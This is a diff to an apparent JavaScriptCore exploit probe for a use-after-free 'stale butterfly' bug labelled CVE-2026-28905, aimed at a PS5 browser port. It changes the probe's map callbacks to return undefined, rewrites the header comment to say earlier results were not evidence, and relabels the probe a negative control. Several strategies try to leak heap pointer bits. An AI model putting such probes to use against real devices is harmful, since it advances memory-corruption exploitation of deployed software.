@@ -1,11 +1,16 @@
 <!--
   p664: CVE-2026-28905 — extract raw pointer bits from stale butterfly
-  p663 confirmed: 600-3000 stale values readable, all type=object (the arr itself).
+  p663 is not evidence for this CVE: its map callback returned `arr`, so every
+  entry it counted as a "stale value" was the normal callback result. The
+  corrected p663 keeps the callback result undefined and only treats non-
+  undefined slots as stale; this probe assumes the same corrected trigger.
   
-  The stale slots contain the ARRAY REFERENCE because the butterfly memory
-  holds the JSValue encoding of arr. We need to make the butterfly slots
-  contain something MORE useful: raw pointer bits that decode as a number.
-  
+  STATUS (2026-11-06): dense-source negative control. The callback result is
+  undefined, the result allocation is pre-initialized, and the public PS5
+  port has JIT/DFG/FTL off. Expected: no marker, pointer, or scalar leak.
+  Any hit is an engine/config divergence requiring the sparse-source re-arm,
+  not standalone CVE evidence.
+
   Strategy:
   1. Pre-fill butterfly memory with float64 values (which ARE raw bits)
   2. Free those arrays → butterfly memory freed but contains our doubles
@@ -75,7 +80,7 @@ try{
 
   function optA(){
     var arr=[0,0,0,0,0,0,0];
-    function f(){arr[0];(0)[0];return arr;}
+    function f(){arr[0];(0)[0];return undefined;}
     var ret=arr.map(f);
     ret[0]=1;
     return ret;
@@ -99,7 +104,7 @@ try{
     emit('A-SAMPLE','i='+samplesA[k].i+',j='+samplesA[k].j+',hex=0x'+samplesA[k].h);
   if(hitsA>0) emit('A-VERDICT','MARKER-RECOVERED — butterfly reuse confirmed');
   else if(samplesA.length>0) emit('A-VERDICT','OTHER-NUMBERS — stale data but not our marker');
-  else emit('A-VERDICT','no-numbers (still getting objects)');
+  else emit('A-VERDICT','no-numbers (callback result is undefined)');
 }catch(e){emit('A-ERR',e.name+':'+e.message);}
 flush();
 
@@ -133,7 +138,7 @@ try{
 
   function optB(){
     var arr=[0,0,0,0,0,0,0];
-    function f(){arr[0];(0)[0];return arr;}
+    function f(){arr[0];(0)[0];return undefined;}
     var ret=arr.map(f);
     ret[0]=1;
     return ret;
@@ -185,7 +190,7 @@ try{
 
   function optC(){
     var arr=[0,0,0,0,0,0,0];
-    function f(){arr[0];(0)[0];return arr;}
+    function f(){arr[0];(0)[0];return undefined;}
     var ret=arr.map(f);
     ret[0]=1;
     return ret;
@@ -232,7 +237,7 @@ try{
     if(ptrLike.length>0) emit('C-VERDICT','HEAP-PTR-LEAK — address disclosed!');
     else emit('C-VERDICT','numbers-but-no-ptrs');
   } else {
-    emit('C-VERDICT','objects-only (NaN-boxing prevents raw ptr read)');
+    emit('C-VERDICT','no-numeric-leak (callback result undefined)');
   }
 }catch(e){emit('C-ERR',e.name+':'+e.message);}
 flush();
@@ -245,7 +250,7 @@ emit('D','bigint-extract');
 try{
   function optD(){
     var arr=[0,0,0,0,0,0,0];
-    function f(){arr[0];(0)[0];return arr;}
+    function f(){arr[0];(0)[0];return undefined;}
     var ret=arr.map(f);
     ret[0]=1;
     return ret;
@@ -294,7 +299,7 @@ try{
   // Use ONLY doubles in the literal — JSC should use CopyOnWriteArrayWithDouble
   function optE(){
     var arr=[1.1,2.2,3.3,4.4,5.5,6.6,7.7];
-    function f(){arr[0];(0)[0];return arr;}
+    function f(){arr[0];(0)[0];return undefined;}
     var ret=arr.map(f);
     ret[0]=99.99;
     return ret;
